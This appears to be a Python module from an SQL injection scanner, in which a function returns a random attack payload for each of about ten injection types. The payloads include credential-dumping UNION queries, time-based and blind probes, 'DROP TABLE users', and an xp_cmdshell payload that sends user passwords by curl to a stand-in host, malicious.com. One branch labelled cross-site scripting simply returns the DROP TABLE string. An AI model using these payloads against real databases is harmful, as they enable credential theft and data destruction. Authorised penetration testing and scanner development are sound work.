import random
from config import DEFAULT_PAYLOADS

def generate_ai_payload(scan_type):
    """Generates a random SQL injection payload based on scan type."""
    if scan_type == "Error-Based SQL Injection":
        return random.choice([
            "' AND 1=1; --",
            "' AND '1'='1'; --",
            "' OR '1'='1'; --"
        ])
    elif scan_type == "Union-Based SQL Injection":
        return random.choice([
            "' UNION SELECT username, password FROM users; --",
            "' UNION ALL SELECT NULL, database(), NULL; --"
        ])
    elif scan_type == "Blind SQL Injection":
        return random.choice([
            "' OR 1=1; --",
            "' AND (SELECT COUNT(*) FROM users) > 0; --"
        ])
    elif scan_type == "Time-Based SQL Injection":
        return random.choice([
            "' OR IF(1=1, SLEEP(5), 0); --",
            "' OR IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0); --"
        ])
    elif scan_type == "Out-of-Band SQL Injection":
        return random.choice([
            "'; EXEC xp_cmdshell('curl http://malicious.com?data='+CONVERT(varchar(10), (SELECT password FROM users))); --"
        ])
    elif scan_type == "Second-Order SQL Injection":
        return random.choice([
            "'; DROP TABLE users; --"
        ])
    elif scan_type == "Stored Procedures Injection":
        return random.choice([
            "'; EXEC sp_msforeachdb 'USE [?]; SELECT name FROM sys.objects'; --"
        ])
    elif scan_type == "Blind Injection with Conditional Responses":
        return random.choice([
            "' OR (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = 'a'; --"
        ])
    elif scan_type == "Cross-Site Scripting (XSS) via SQL Injection":
        return random.choice([
            "'; DROP TABLE users; --"
        ])
    elif scan_type == "Automated Scanning with Fuzzing Techniques":
        return random.choice([
            "' OR '1'='1' --",
            "'; --"
        ])
    else:
        return random.choice(DEFAULT_PAYLOADS)  # Fallback to default payloads if no specific type
